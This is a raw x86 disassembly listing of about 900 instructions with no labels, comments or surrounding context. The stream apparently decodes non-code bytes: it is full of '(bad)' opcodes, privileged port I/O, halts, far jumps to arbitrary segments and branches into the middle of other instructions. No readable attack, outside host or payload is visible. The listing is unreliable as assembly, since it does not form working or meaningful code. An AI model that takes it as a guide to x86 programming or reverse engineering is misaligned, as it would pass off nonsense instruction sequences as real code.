  41ae01:	cmp    DWORD PTR [ebx+0x29],edx
  41ae04:	mov    ebx,0x4e161716
  41ae09:	leave  
  41ae0a:	cwde   
  41ae0b:	xchg   ebx,eax
  41ae0c:	push   esi
  41ae0d:	icebp  
  41ae0e:	outs   dx,BYTE PTR ds:[esi]
  41ae0f:	jbe    0x41adb2
  41ae11:	es jmp 0x4cebf323
  41ae17:	pop    esi
  41ae18:	sbb    al,BYTE PTR [edx+0x62487fa3]
  41ae1e:	push   0x871e1d99
  41ae23:	jmp    0xae42:0xc17a6019
  41ae2a:	je     0x41ae60
  41ae2c:	pop    ecx
  41ae2d:	(bad)  
  41ae2e:	sbb    DWORD PTR [edx],edi
  41ae30:	dec    edx
  41ae31:	jae    0x41ae96
  41ae33:	dec    eax
  41ae34:	stos   DWORD PTR es:[edi],eax
  41ae35:	jl     0x41addc
  41ae37:	cmp    DWORD PTR [esi],edx
  41ae39:	ins    BYTE PTR es:[edi],dx
  41ae3a:	jp     0x41ae95
  41ae3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae3d:	sub    DWORD PTR [edx+0x398984cf],eax
  41ae43:	xchg   ebp,eax
  41ae44:	add    eax,0x7158ae14
  41ae49:	imul   ebp,DWORD PTR [edi-0x4e],0x631c29b4
  41ae50:	sbb    BYTE PTR [esi-0x5e],bl
  41ae53:	cmp    BYTE PTR [ebx],bh
  41ae55:	ja     0x41aeca
  41ae57:	adc    DWORD PTR [eax-0x31cfa605],esi
  41ae5d:	aam    0xdf
  41ae5f:	mov    esi,0xb3f745cb
  41ae64:	cli    
  41ae65:	push   0xffffffd6
  41ae67:	cmp    al,dh
  41ae69:	cli    
  41ae6a:	jno    0x41ae89
  41ae6c:	and    BYTE PTR [eax-0x12755eaa],al
  41ae72:	pusha  
  41ae73:	add    eax,0x8e0dd6da
  41ae78:	lahf   
  41ae79:	push   0x42450793
  41ae7e:	ja     0x41ae71
  41ae80:	jecxz  0x41aead
  41ae82:	adc    esp,eax
  41ae84:	add    eax,0x422a0374
  41ae89:	jle    0x41ae88
  41ae8b:	daa    
  41ae8c:	popa   
  41ae8d:	jp     0x41ae8a
  41ae8f:	dec    edx
  41ae90:	fnstcw WORD PTR [ecx+0x58]
  41ae93:	inc    ecx
  41ae94:	adc    esp,DWORD PTR [ebx-0x61]
  41ae97:	jmp    0x41ae61
  41ae99:	and    BYTE PTR [edi+0x127b2ccf],0x5f
  41aea0:	or     DWORD PTR [ecx],0x23ffe890
  41aea6:	mov    al,0xb9
  41aea8:	sub    esi,DWORD PTR [edx+eiz*2]
  41aeab:	mov    edi,DWORD PTR [edi]
  41aead:	mov    al,ds:0x64e6b788
  41aeb2:	int    0x76
  41aeb4:	xchg   edx,eax
  41aeb5:	sub    ebp,ebx
  41aeb7:	hlt    
  41aeb8:	imul   esp,eax,0x9e7d03ac
  41aebe:	and    al,0x43
  41aec0:	enter  0x8053,0x84
  41aec4:	popa   
  41aec5:	mov    eax,ds:0x5a45784
  41aeca:	(bad)  
  41aecb:	mov    edx,0x95616f8c
  41aed0:	sahf   
  41aed1:	ins    BYTE PTR es:[edi],dx
  41aed2:	add    DWORD PTR [eax+0x349ad2c4],esp
  41aed8:	sbb    DWORD PTR [edi+0x377cbebb],eax
  41aede:	or     ebp,edi
  41aee0:	(bad)  
  41aee2:	fidivr DWORD PTR [edi+ebp*1-0x43]
  41aee6:	and    eax,0x1c59296f
  41aeeb:	xchg   edi,eax
  41aeec:	pop    edi
  41aeed:	add    dl,cl
  41aeef:	sub    BYTE PTR [ebp+0x795d994],0xb
  41aef6:	mov    fs,WORD PTR [esp+ecx*4+0x20428c19]
  41aefd:	retf   0xe6f9
  41af00:	dec    eax
  41af01:	fidiv  DWORD PTR [eax+edi*8+0x1e1cba13]
  41af08:	mov    al,0x54
  41af0a:	out    0xee,eax
  41af0c:	add    dl,BYTE PTR [ebp-0x5ca855a2]
  41af12:	and    ecx,DWORD PTR ds:0xc2e8d8cc
  41af18:	test   al,0x68
  41af1a:	mov    ds:0x317d6795,al
  41af1f:	mov    ds:0x1daca569,eax
  41af24:	or     DWORD PTR [ecx],eax
  41af26:	fisub  WORD PTR [ebp-0x4ab6fbd7]
  41af2c:	inc    esp
  41af2d:	and    eax,0x987f942e
  41af32:	mov    ebx,0x4c5dd39e
  41af37:	jo     0x41af98
  41af39:	xor    ah,BYTE PTR [ebx-0x6f2bc16f]
  41af3f:	std    
  41af40:	dec    ebx
  41af41:	stc    
  41af42:	cmp    edi,DWORD PTR [ecx+0x33]
  41af45:	cmp    DWORD PTR [ecx],eax
  41af47:	jnp    0x41af76
  41af49:	inc    edi
  41af4a:	xchg   ecx,eax
  41af4b:	loop   0x41afb3
  41af4d:	fist   DWORD PTR [ecx]
  41af4f:	fst    QWORD PTR [ebx-0x56901868]
  41af55:	fsubr  DWORD PTR [edx+0x34d11c19]
  41af5b:	mov    ds:0xd6c91b83,al
  41af60:	ja     0x41af68
  41af62:	add    BYTE PTR [esi+0x5053f4eb],cl
  41af68:	jae    0x41af16
  41af6a:	popf   
  41af6b:	sub    al,0x1c
  41af6d:	and    eax,0xcb10961c
  41af72:	leave  
  41af73:	imul   eax
  41af75:	cmp    al,0x10
  41af77:	lea    ebx,[ecx-0x7a4c56b9]
  41af7d:	data16 fwait
  41af7f:	popa   
  41af80:	jg     0x41afb3
  41af82:	mov    bh,0x4a
  41af84:	adc    al,ch
  41af86:	mov    edi,0xb15a9660
  41af8b:	adc    esp,DWORD PTR [edx-0x33]
  41af8e:	pop    es
  41af8f:	daa    
  41af90:	cmp    bl,BYTE PTR [ebp+0x138da32]
  41af96:	inc    esi
  41af97:	fs sbb dl,0xd7
  41af9b:	pop    ss
  41af9c:	fcmovnu st,st(3)
  41af9e:	add    eax,0x5994922f
  41afa3:	arpl   WORD PTR [ebx+0x6b],ax
  41afa6:	mov    cl,0x7
  41afa8:	das    
  41afa9:	pop    ss
  41afaa:	cmp    edx,DWORD PTR [ebx+eiz*2]
  41afad:	ins    DWORD PTR es:[edi],dx
  41afae:	ret    
  41afaf:	retf   
  41afb0:	push   0x6b7a8670
  41afb5:	push   ebx
  41afb6:	mov    bl,0xef
  41afb8:	push   esp
  41afb9:	pop    ecx
  41afba:	xor    BYTE PTR [ebx+ebx*8],bh
  41afbd:	fisttp DWORD PTR [esp+edi*2+0x8]
  41afc1:	stos   DWORD PTR es:[edi],eax
  41afc2:	cmp    al,0xdb
  41afc4:	sub    ecx,DWORD PTR [edi+0x5f]
  41afc7:	mov    ecx,0xbc33ff3f
  41afcc:	or     BYTE PTR [ebp+edx*8+0x39],0x4f
  41afd1:	jg     0x41b03b
  41afd3:	xor    BYTE PTR [eax+0x15090e22],dl
  41afd9:	jno    0x41b058
  41afdb:	jge    0x41b048
  41afdd:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afdf:	lock pop DWORD PTR ds:0x3eb14b1a
  41afe6:	aas    
  41afe7:	jp     0x41af95
  41afe9:	cld    
  41afea:	loop   0x41b062
  41afec:	mov    ds:0xd9cb1d7d,eax
  41aff1:	jmp    0xd13263de
  41aff6:	push   ebp
  41aff7:	mov    al,0x8
  41aff9:	xor    al,0x9f
  41affb:	xor    BYTE PTR [edi+0xf414fb4],bh
  41b001:	js     0x41b02b
  41b003:	test   DWORD PTR [eax-0x51],ecx
  41b006:	xor    ah,BYTE PTR [esi+ebx*2]
  41b009:	test   eax,0xfd01d2a3
  41b00e:	mov    bl,0x57
  41b010:	or     esp,DWORD PTR [edi+0x7]
  41b013:	mov    cl,0x16
  41b015:	inc    BYTE PTR ds:0x304fb8c3
  41b01b:	pusha  
  41b01c:	sete   dh
  41b01f:	adc    al,0xf
  41b021:	xor    BYTE PTR [edi-0x2f],al
  41b024:	jno    0x41b019
  41b026:	mov    edx,DWORD PTR ds:0x2bf03902
  41b02c:	lock sbb al,0xd3
  41b030:	sbb    BYTE PTR [ecx+0x66],ch
  41b033:	lock add BYTE PTR [edx+0x4a2dc293],cl
  41b03a:	mov    eax,ds:0xdd3cbbbc
  41b03f:	(bad)  
  41b040:	(bad)  [eax-0x7c]
  41b043:	inc    eax
  41b044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b045:	fidivr WORD PTR [edx+0x66978471]
  41b04b:	sub    eax,0x50d985a
  41b050:	sbb    BYTE PTR [ebp-0x24],0x3e
  41b054:	pop    esp
  41b055:	sti    
  41b056:	add    ecx,DWORD PTR [esp+ecx*1+0x71]
  41b05a:	mov    dl,0x13
  41b05c:	mul    cl
  41b05e:	dec    esi
  41b05f:	adc    DWORD PTR [edx-0x41],ecx
  41b062:	jae    0x41b082
  41b064:	cli    
  41b065:	cmp    ecx,ebx
  41b067:	sti    
  41b068:	add    ah,ah
  41b06a:	push   esi
  41b06b:	pop    ds
  41b06c:	shl    BYTE PTR [edx+0x1f],0x7
  41b070:	jmp    FWORD PTR [edx-0x2ba62a9f]
  41b076:	inc    esp
  41b077:	jmp    0x41b0d4
  41b079:	adc    BYTE PTR ds:0x2f5217fd,dl
  41b07f:	out    0x1e,eax
  41b081:	dec    eax
  41b082:	(bad)  
  41b084:	mov    edx,0x98b726f9
  41b089:	rcl    DWORD PTR [esi+0x5f510298],1
  41b08f:	data16 add BYTE PTR [eax+0x36357108],ch
  41b096:	fisub  WORD PTR [ecx]
  41b098:	icebp  
  41b099:	xor    al,0x83
  41b09b:	pop    esp
  41b09c:	jl     0x75746d1c
  41b0a2:	mov    dh,0xfc
  41b0a4:	jmp    0xf5a0d4bd
  41b0a9:	(bad)  
  41b0aa:	xchg   ebp,eax
  41b0ab:	dec    edx
  41b0ac:	mov    ecx,0xd763ea9a
  41b0b1:	int    0xa7
  41b0b3:	aam    0x2f
  41b0b5:	popf   
  41b0b6:	mov    bl,0x10
  41b0b8:	cmp    eax,0xbc95e898
  41b0bd:	mov    al,ds:0xf54e82c8
  41b0c2:	(bad)  
  41b0c3:	or     bh,al
  41b0c5:	pushf  
  41b0c6:	rep lods al,BYTE PTR ds:[esi]
  41b0c8:	mov    bh,0xf9
  41b0ca:	adc    edx,DWORD PTR [edi-0x69]
  41b0cd:	add    BYTE PTR [ebp+edi*2+0x371ab502],bh
  41b0d4:	xor    esp,DWORD PTR [ebx]
  41b0d6:	mov    ?,edi
  41b0d8:	xor    al,BYTE PTR [edi+eiz*1-0x68]
  41b0dc:	lahf   
  41b0dd:	out    dx,eax
  41b0de:	out    dx,eax
  41b0df:	pop    edi
  41b0e0:	pop    esi
  41b0e1:	in     eax,dx
  41b0e2:	push   ss
  41b0e3:	ret    
  41b0e4:	jns    0x41b135
  41b0e6:	cmp    dh,BYTE PTR [edx-0x2e5ff8a9]
  41b0ec:	mov    eax,0xaa48d7de
  41b0f1:	in     eax,dx
  41b0f2:	and    ebx,DWORD PTR [edi-0x24]
  41b0f5:	bound  esp,QWORD PTR [esi+0x4c]
  41b0f8:	cmp    BYTE PTR [esi+0x7dd2833f],cl
  41b0fe:	outs   dx,DWORD PTR ds:[esi]
  41b0ff:	inc    ebp
  41b100:	and    DWORD PTR [esi],0x1d2cc826
  41b106:	cmc    
  41b107:	add    al,0xf6
  41b109:	outs   dx,DWORD PTR ds:[esi]
  41b10a:	out    dx,al
  41b10b:	dec    edi
  41b10c:	stc    
  41b10d:	push   eax
  41b10e:	sbb    edi,DWORD PTR [eax+ebx*1]
  41b111:	pop    ebx
  41b112:	imul   eax,DWORD PTR [edx-0x553c7eb3],0xffffffc7
  41b119:	xchg   BYTE PTR [ebp+0x5e],al
  41b11c:	push   ds
  41b11d:	push   ebx
  41b11e:	nop
  41b11f:	adc    eax,0x6e4cd0f9
  41b124:	cld    
  41b125:	mov    esi,0x31b72431
  41b12a:	imul   edx,ebx,0x9f7ccf0c
  41b130:	ret    
  41b131:	arpl   ax,cx
  41b133:	mov    es,WORD PTR ds:0x8396343c
  41b139:	aaa    
  41b13a:	sub    ebp,edi
  41b13c:	test   DWORD PTR [edi+0x24db1bc4],ebx
  41b142:	sbb    al,0x96
  41b144:	rcl    DWORD PTR [esi],1
  41b146:	lods   eax,DWORD PTR ds:[esi]
  41b147:	xchg   DWORD PTR [edi],eax
  41b149:	ja     0x41b116
  41b14b:	jns    0x41b12a
  41b14d:	adc    eax,0x89770626
  41b152:	xlat   BYTE PTR ds:[ebx]
  41b153:	aaa    
  41b154:	arpl   WORD PTR [ecx],di
  41b156:	pop    ebp
  41b157:	jle    0x41b0ff
  41b159:	mov    BYTE PTR [ebx-0x218fe4f2],dl
  41b15f:	mov    eax,edi
  41b161:	nop
  41b162:	mov    al,ds:0x3fd3e848
  41b167:	inc    esi
  41b168:	mov    dh,0xd2
  41b16a:	(bad)  
  41b16b:	jmp    0xf10f05ed
  41b170:	add    BYTE PTR [edx],bh
  41b172:	(bad)  
  41b173:	push   eax
  41b174:	push   0x90d2377f
  41b179:	fdivr  st(7),st
  41b17b:	aam    0xa6
  41b17d:	jb     0x41b175
  41b17f:	jno    0x41b151
  41b181:	and    al,0xaf
  41b183:	shl    BYTE PTR [edi],1
  41b185:	(bad)  
  41b186:	out    dx,al
  41b187:	xchg   DWORD PTR [edx+eax*2+0x5a119c72],ebp
  41b18e:	out    dx,al
  41b18f:	fdiv   st(5),st
  41b191:	or     eax,0x4e761c0e
  41b196:	daa    
  41b197:	adc    ebx,ebp
  41b199:	(bad)  
  41b19a:	mov    cl,0xe8
  41b19c:	mov    al,0xe9
  41b19e:	jae    0x41b127
  41b1a0:	xchg   dh,ch
  41b1a2:	test   DWORD PTR [ebx+ebx*4-0x18],esi
  41b1a6:	jmp    0x8661:0x92bcdc4f
  41b1ad:	inc    ebp
  41b1ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1af:	add    BYTE PTR [esi-0x79],ah
  41b1b2:	pop    ds
  41b1b3:	inc    BYTE PTR [edx+0x2f]
  41b1b6:	fidiv  DWORD PTR ds:0x37e9
  41b1bb:	xor    eax,0x15bfbe41
  41b1c0:	mov    dl,0xaa
  41b1c2:	popa   
  41b1c3:	hlt    
  41b1c4:	call   DWORD PTR [edi]
  41b1c6:	pushf  
  41b1c7:	sub    eax,0x32d3b7c6
  41b1cc:	retf   
  41b1cd:	outs   dx,DWORD PTR ds:[esi]
  41b1ce:	je     0x41b1aa
  41b1d0:	mov    edx,0xb78e0745
  41b1d5:	cli    
  41b1d6:	shr    ebp,0x16
  41b1d9:	xor    al,BYTE PTR [ebx-0x6234eec]
  41b1df:	push   ecx
  41b1e0:	jge    0x41b221
  41b1e2:	push   edi
  41b1e3:	ins    BYTE PTR es:[edi],dx
  41b1e4:	pusha  
  41b1e5:	(bad)  
  41b1e6:	loope  0x41b21d
  41b1e8:	fs mov esp,0xdd5416bc
  41b1ee:	sub    dh,BYTE PTR [ebx]
  41b1f0:	out    0xd2,eax
  41b1f2:	push   ebp
  41b1f3:	inc    edx
  41b1f4:	(bad)  
  41b1f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1f6:	push   ecx
  41b1f7:	push   es
  41b1f8:	or     cl,ch
  41b1fa:	sbb    BYTE PTR [eax-0x1ec56d92],ah
  41b200:	outs   dx,DWORD PTR ds:[esi]
  41b201:	or     ebx,eax
  41b203:	ins    BYTE PTR es:[edi],dx
  41b204:	sub    eax,0x74d74caa
  41b209:	sub    al,0xd4
  41b20b:	call   0x9213167b
  41b210:	cmp    ch,cl
  41b212:	xor    BYTE PTR [ecx-0x69],0x96
  41b216:	mov    esi,0xa4e3f7d8
  41b21b:	shr    DWORD PTR [edi+0x71886148],1
  41b221:	repz scas al,BYTE PTR es:[edi]
  41b223:	call   0x4866b5ba
  41b228:	test   BYTE PTR ds:0xeb490005,ah
  41b22e:	fisttp DWORD PTR [edi]
  41b230:	fwait
  41b231:	jns    0x41b276
  41b233:	outs   dx,DWORD PTR ds:[esi]
  41b234:	retf   0x77f7
  41b237:	cli    
  41b238:	mov    dl,0xa2
  41b23a:	mov    WORD PTR [eax-0xf],gs
  41b23d:	sub    ebx,DWORD PTR [edi+0x252c70b1]
  41b243:	(bad)  
  41b244:	xor    al,BYTE PTR [ebx-0x54]
  41b247:	shr    BYTE PTR [esi+0x723975a9],1
  41b24d:	call   0xe264a500
  41b252:	lds    ebp,FWORD PTR [edx-0x402f859b]
  41b258:	mov    ebp,0x56ebd7d4
  41b25d:	adc    al,0x20
  41b25f:	repz sbb al,0xc
  41b262:	pop    esi
  41b263:	pop    ebx
  41b264:	cmp    BYTE PTR [ecx+0xb],cl
  41b267:	jmp    0x72f7:0x565b5b4d
  41b26e:	push   ebp
  41b26f:	push   cs
  41b270:	enter  0xd22e,0x2c
  41b274:	xor    ecx,ecx
  41b276:	pop    ds
  41b277:	xchg   ebp,eax
  41b278:	bound  ebx,QWORD PTR [edx+0x5ca49efd]
  41b27e:	hlt    
  41b27f:	push   cs
  41b280:	(bad)  
  41b281:	inc    ebp
  41b282:	sub    eax,0xec2453b5
  41b287:	cld    
  41b288:	xchg   BYTE PTR [ebx+0x27],cl
  41b28b:	js     0x41b217
  41b28d:	fisubr WORD PTR [esi+0xd]
  41b290:	ret    
  41b291:	push   esp
  41b292:	mov    edx,0xa967fdf0
  41b297:	scas   eax,DWORD PTR es:[edi]
  41b298:	xchg   esi,eax
  41b299:	xor    BYTE PTR [ecx+esi*4-0x4c394caf],dl
  41b2a0:	pop    ebp
  41b2a1:	xor    BYTE PTR [ebp+edx*2-0x16c0175e],dl
  41b2a8:	or     esi,DWORD PTR [ebp+0x12f71b75]
  41b2ae:	jl     0x41b29f
  41b2b0:	push   es
  41b2b1:	jge    0x41b2d9
  41b2b3:	inc    edi
  41b2b4:	mov    dh,0xb
  41b2b6:	mov    eax,0x416396bc
  41b2bb:	sub    eax,0xbed299fb
  41b2c0:	dec    ebp
  41b2c1:	mov    dl,0x17
  41b2c3:	push   eax
  41b2c4:	les    esp,FWORD PTR [ebx+0x2b3073f6]
  41b2ca:	daa    
  41b2cb:	rol    BYTE PTR fs:[esi+edx*2],1
  41b2cf:	out    dx,al
  41b2d0:	int    0xe9
  41b2d2:	sti    
  41b2d3:	in     al,dx
  41b2d4:	int3   
  41b2d5:	out    0x16,al
  41b2d7:	sbb    bl,bh
  41b2d9:	adc    ebx,esi
  41b2db:	or     eax,0x39ab09cb
  41b2e0:	add    al,bl
  41b2e2:	sub    ecx,ebp
  41b2e4:	and    ecx,DWORD PTR [eax]
  41b2e6:	jecxz  0x41b28b
  41b2e8:	jae    0x41b28a
  41b2ea:	test   DWORD PTR [edx+0x47],ebx
  41b2ed:	lods   al,BYTE PTR ds:[esi]
  41b2ee:	lahf   
  41b2ef:	stos   DWORD PTR es:[edi],eax
  41b2f0:	in     eax,0xa5
  41b2f2:	push   eax
  41b2f3:	je     0x41b339
  41b2f5:	dec    edi
  41b2f6:	loope  0x41b2e7
  41b2f8:	add    edx,DWORD PTR ds:0x500cd49
  41b2fe:	push   esp
  41b2ff:	(bad)  
  41b300:	je     0x41b362
  41b302:	xor    bl,BYTE PTR [ebp+0xddd52cb]
  41b308:	addr16 stc 
  41b30a:	pop    ebx
  41b30b:	sti    
  41b30c:	push   ecx
  41b30d:	mov    esi,0xc24b162f
  41b312:	sbb    al,0x1
  41b314:	les    esi,FWORD PTR [esi-0x11]
  41b317:	int    0x56
  41b319:	mov    ebp,0x11ed57b5
  41b31e:	scas   eax,DWORD PTR es:[edi]
  41b31f:	les    esp,FWORD PTR [esi+0x55f32a00]
  41b325:	test   DWORD PTR [ebp+0x6f],edx
  41b328:	cwde   
  41b329:	adc    ah,BYTE PTR [ebx+eax*8-0x39]
  41b32d:	out    dx,eax
  41b32e:	mov    edx,ebp
  41b330:	int    0x57
  41b332:	cmp    DWORD PTR [ecx-0x6b9cca54],edx
  41b338:	sbb    BYTE PTR [edx-0x1f685fc5],dh
  41b33e:	rol    DWORD PTR [edx-0x7595b745],cl
  41b344:	iret   
  41b345:	fimul  WORD PTR [ebp-0x50d63c30]
  41b34b:	ja     0x41b2e2
  41b34d:	dec    edx
  41b34e:	jmp    0x41b37e
  41b350:	lahf   
  41b351:	arpl   ax,ax
  41b353:	push   0x646bf652
  41b358:	and    ch,BYTE PTR ds:[ebp-0x5f61595b]
  41b35f:	fmul   DWORD PTR ss:[ecx+0x770fcdc4]
  41b366:	jg     0x41b3d8
  41b368:	xchg   BYTE PTR [ecx+0x57332011],ch
  41b36e:	ret    0x22c7
  41b371:	sub    DWORD PTR [eax],ebx
  41b373:	sahf   
  41b374:	add    BYTE PTR [edi+0x52],ah
  41b377:	stos   BYTE PTR es:[edi],al
  41b378:	loop   0x41b3d7
  41b37a:	or     al,0x88
  41b37c:	pop    ecx
  41b37d:	ror    BYTE PTR [esi-0x13],0x50
  41b381:	push   eax
  41b382:	ds jbe 0x41b339
  41b385:	ror    DWORD PTR [eax+ebx*2-0x545a146a],1
  41b38c:	lds    ebx,FWORD PTR [edx+0x23c18f0a]
  41b392:	mov    al,ds:0x5f0c2d49
  41b397:	test   al,0xc
  41b399:	push   edi
  41b39a:	jp     0x41b398
  41b39c:	cmp    al,0xc7
  41b39e:	adc    bh,BYTE PTR [edi]
  41b3a0:	cmp    edx,DWORD PTR [ebp+0x22]
  41b3a3:	dec    ebx
  41b3a4:	outs   dx,BYTE PTR ds:[esi]
  41b3a5:	(bad)  
  41b3a6:	sti    
  41b3a7:	cmp    DWORD PTR ds:0x4762f4bf,esi
  41b3ad:	or     edx,DWORD PTR ds:0xda9526c3
  41b3b3:	xchg   edx,eax
  41b3b4:	jo     0x41b35d
  41b3b6:	add    eax,0x12434aa
  41b3bb:	jmp    DWORD PTR [edi]
  41b3bd:	add    bl,ah
  41b3bf:	push   edi
  41b3c0:	int    0x99
  41b3c2:	cli    
  41b3c3:	and    eax,esi
  41b3c5:	mov    al,0x1f
  41b3c7:	pop    ebx
  41b3c8:	and    eax,DWORD PTR [ebx]
  41b3ca:	ror    DWORD PTR [eax],1
  41b3cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3cd:	mov    dl,0xe
  41b3cf:	xchg   ebp,eax
  41b3d0:	sub    al,0x54
  41b3d2:	jge    0x41b3d5
  41b3d4:	cdq    
  41b3d5:	nop
  41b3d6:	jp     0x41b378
  41b3d8:	imul   DWORD PTR [ebp-0x62814672]
  41b3de:	into   
  41b3df:	mov    al,0xff
  41b3e1:	test   DWORD PTR [edi-0x24156d21],0x99e55dc
  41b3eb:	stc    
  41b3ec:	push   0x7262d49e
  41b3f1:	xlat   BYTE PTR ds:[ebx]
  41b3f2:	rol    BYTE PTR [edx-0x61a28c97],0x8a
  41b3f9:	push   eax
  41b3fa:	dec    ecx
  41b3fb:	adc    DWORD PTR [ebx-0x72],0x5799fafb
  41b402:	xor    BYTE PTR [ecx],ch
  41b404:	cmp    al,0x8b
  41b406:	xchg   ebx,eax
  41b407:	pop    eax
  41b408:	xchg   ebx,eax
  41b409:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b40a:	(bad)  
  41b40b:	cmp    dl,BYTE PTR [ecx]
  41b40d:	popf   
  41b40e:	gs jmp 0x41b3af
  41b411:	cwde   
  41b412:	icebp  
  41b413:	xchg   ebp,eax
  41b414:	rcr    BYTE PTR [ebx+0x6b],cl
  41b417:	xor    BYTE PTR [ecx+0x6006b49d],ch
  41b41d:	in     al,0x2b
  41b41f:	imul   esi,DWORD PTR [ecx+0x57187007],0xffffff8a
  41b426:	push   esi
  41b427:	push   edi
  41b428:	adc    BYTE PTR [ebx-0x3d],al
  41b42b:	stc    
  41b42c:	fsub   QWORD PTR [edi+0x10e9615a]
  41b432:	dec    esi
  41b433:	mov    WORD PTR [edx-0x2f],ds
  41b436:	inc    esp
  41b437:	add    ecx,DWORD PTR [ebx+0x9f2490f]
  41b43d:	dec    edi
  41b43e:	das    
  41b43f:	add    BYTE PTR [eax+0x7d],ah
  41b442:	mov    WORD PTR [edx-0x17],cs
  41b445:	xchg   esi,eax
  41b446:	add    BYTE PTR [esp+edx*1+0x70],al
  41b44a:	jge    0x41b3f6
  41b44c:	loopne 0x41b4ae
  41b44e:	scas   eax,DWORD PTR es:[edi]
  41b44f:	stc    
  41b450:	pop    eax
  41b451:	imul   esi,DWORD PTR [eax+0x45],0xfffffffe
  41b455:	adc    eax,0xcd55a891
  41b45a:	mov    cl,BYTE PTR [esi]
  41b45c:	push   cs
  41b45d:	mov    bl,al
  41b45f:	(bad)  
  41b461:	shl    DWORD PTR [eax-0x57],cl
  41b464:	out    0xb2,eax
  41b466:	xabort 0x59
  41b469:	xlat   BYTE PTR ds:[ebx]
  41b46a:	mov    ebp,0xc9ed0b47
  41b46f:	sar    dl,cl
  41b471:	rcr    BYTE PTR [ebx],cl
  41b473:	and    cl,cl
  41b475:	lea    esi,[ebx+eax*8-0x3524166c]
  41b47c:	mov    bh,0xcb
  41b47e:	dec    ecx
  41b47f:	sbb    ecx,DWORD PTR [edi-0x4818315e]
  41b485:	xor    dl,0x74
  41b488:	jnp    0x41b454
  41b48a:	dec    edx
  41b48b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b48c:	test   al,0xf1
  41b48e:	mov    dl,0x63
  41b490:	mov    cl,0xa8
  41b492:	jns    0x41b4bc
  41b494:	pop    es
  41b495:	scas   al,BYTE PTR es:[edi]
  41b496:	lahf   
  41b497:	repnz (bad) 
  41b499:	mov    ch,0xa1
  41b49b:	push   ebx
  41b49c:	mov    bh,0xf9
  41b49e:	xchg   esi,eax
  41b49f:	fs jmp 0x3ea6d894
  41b4a5:	sbb    al,0x6
  41b4a7:	mov    ecx,0x7e35901f
  41b4ac:	or     ebx,edi
  41b4ae:	sar    DWORD PTR [ebp-0x5e],1
  41b4b1:	jnp    0x41b46c
  41b4b3:	(bad)  
  41b4b4:	adc    ebp,ebp
  41b4b6:	push   ebp
  41b4b7:	sub    edi,edx
  41b4b9:	sbb    DWORD PTR [ecx-0x40],ebp
  41b4bc:	push   ds
  41b4bd:	jmp    0x41b489
  41b4bf:	rol    BYTE PTR [ebx],1
  41b4c1:	mov    dh,0x10
  41b4c3:	adc    BYTE PTR [edx+0x70df1474],ch
  41b4c9:	sub    DWORD PTR [edi-0x6c71c2d],ebx
  41b4cf:	out    0x1a,al
  41b4d1:	shl    DWORD PTR [edi],0xbf
  41b4d4:	cmp    DWORD PTR [ebp-0x4cc8a65c],ebp
  41b4da:	imul   esi,DWORD PTR [ecx+esi*1-0x38569f],0x68
  41b4e2:	das    
  41b4e3:	int    0xff
  41b4e5:	mov    ds:0x787d351c,eax
  41b4ea:	xor    bl,BYTE PTR [esi-0x27ef2315]
  41b4f0:	jmp    0x286626e9
  41b4f5:	add    dl,BYTE PTR [ebp-0x7a176774]
  41b4fb:	scas   eax,DWORD PTR es:[edi]
  41b4fc:	inc    eax
  41b4fd:	xchg   edi,eax
  41b4fe:	sti    
  41b4ff:	adc    eax,0x831eabb2
  41b504:	pop    ds
  41b505:	adc    ah,bl
  41b507:	xchg   BYTE PTR [edx-0x2c],al
  41b50a:	add    BYTE PTR [esi],ah
  41b50c:	mov    cl,BYTE PTR ds:0xafc72133
  41b512:	jmp    0x41b572
  41b514:	mov    cl,0x99
  41b516:	test   eax,0x1546b010
  41b51b:	scas   eax,DWORD PTR es:[edi]
  41b51c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b51d:	jg     0x41b4ec
  41b51f:	xor    DWORD PTR [esi],ecx
  41b521:	dec    ecx
  41b522:	clc    
  41b523:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b524:	fwait
  41b525:	push   sp
  41b527:	cmp    al,0xbc
  41b529:	dec    ecx
  41b52a:	repnz inc ebp
  41b52c:	rol    BYTE PTR ds:0x34f3f355,1
  41b532:	(bad)  
  41b533:	dec    ebx
  41b534:	ficomp DWORD PTR [ecx+0x18]
  41b537:	(bad)  
  41b538:	(bad)  
  41b539:	enter  0x9b2f,0xfa
  41b53d:	loope  0x41b58f
  41b53f:	inc    ebx
  41b540:	cmc    
  41b541:	aas    
  41b542:	idiv   DWORD PTR [edx]
  41b544:	retf   
  41b545:	mov    WORD PTR [esi+0x19188c6b],fs
  41b54b:	xchg   DWORD PTR [eax+0x65],ebx
  41b54e:	push   ds
  41b54f:	ror    DWORD PTR [ebp-0x19ca7fbd],1
  41b555:	pop    ebx
  41b556:	es add al,0x63
  41b559:	mov    ch,0x70
  41b55b:	clc    
  41b55c:	push   0x5
  41b55e:	ja     0x41b56b
  41b560:	cld    
  41b561:	sub    eax,0x3ca76083
  41b566:	arpl   dx,cx
  41b568:	js     0x41b550
  41b56a:	and    bl,cl
  41b56c:	outs   dx,BYTE PTR ds:[esi]
  41b56d:	jo     0x41b522
  41b56f:	add    al,0xdd
  41b571:	enter  0x7b66,0xb1
  41b575:	push   eax
  41b576:	mov    dh,0x50
  41b578:	cmc    
  41b579:	ror    BYTE PTR [edi],cl
  41b57b:	ret    
  41b57c:	inc    edi
  41b57d:	and    BYTE PTR [eax],al
  41b57f:	(bad)  
  41b581:	jmp    0x8b2f:0xfbf6b689
  41b588:	jle    0x41b59b
  41b58a:	dec    ebp
  41b58b:	xor    eax,0x5d0f2646
  41b590:	add    eax,0xa4f3be71
  41b595:	ret    0xd235
  41b598:	inc    eax
  41b599:	xchg   edi,eax
  41b59a:	enter  0x8217,0xab
  41b59e:	icebp  
  41b59f:	fst    DWORD PTR [ebx-0x1b]
  41b5a2:	adc    edi,edx
  41b5a4:	repnz xlat BYTE PTR ds:[ebx]
  41b5a6:	cmp    edi,DWORD PTR [ebp-0x729dd03c]
  41b5ac:	add    edi,DWORD PTR [edx+0x1a26745b]
  41b5b2:	jmp    0x41b5dd
